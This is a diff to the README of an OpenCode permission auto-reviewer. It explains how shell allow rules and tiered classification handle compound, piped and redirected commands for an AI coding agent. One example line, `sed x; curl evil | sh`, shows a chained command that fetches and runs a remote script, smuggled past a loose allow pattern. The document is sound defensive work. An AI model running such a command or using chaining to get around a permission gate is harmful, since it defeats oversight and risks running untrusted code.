@@ -156,7 +156,8 @@ Deliberate limits, all on the safe side:
   default, not a considered verdict, so `allow` and `ask` catch-alls are
   ignored. Otherwise a `"*": "ask"` baseline would stop the reviewer from ever
   running. A catch-all `deny` is kept.
-- A shell `allow` does not cover chained, piped, or redirected commands
+- A shell `allow` must cover every sub-command of a split call, and does not
+  cover a single command containing chaining, pipes, or redirects
   (`sed *` also matches `sed x; curl evil | sh`); those still go to the
   reviewer. Deny and ask patterns still apply to them.
 - Config `allow` only applies when OpenCode itself already allows the request.
@@ -210,6 +211,11 @@ explanation attached.
 
 Inspired by [Anthropic's Claude Code auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode)
 and [pi-auto-reviewer](https://github.com/vinzenzu/pi-auto-reviewer):
+
+- OpenCode splits a compound shell call (`a; b`, `a | b`) into one resource per
+  sub-command. Tiers 1 and 2 classify **every** sub-command and the strictest
+  result wins: any dangerous one is denied, any unrecognized one goes to
+  review, and only an all-safe call is auto-allowed.
 
 - **Tier 1 (auto-allow, instant, no LLM cost)**: safe read-only commands —
   `ls`, `cat`, `grep`, `git status`, `git log`, `git diff`, `echo`,
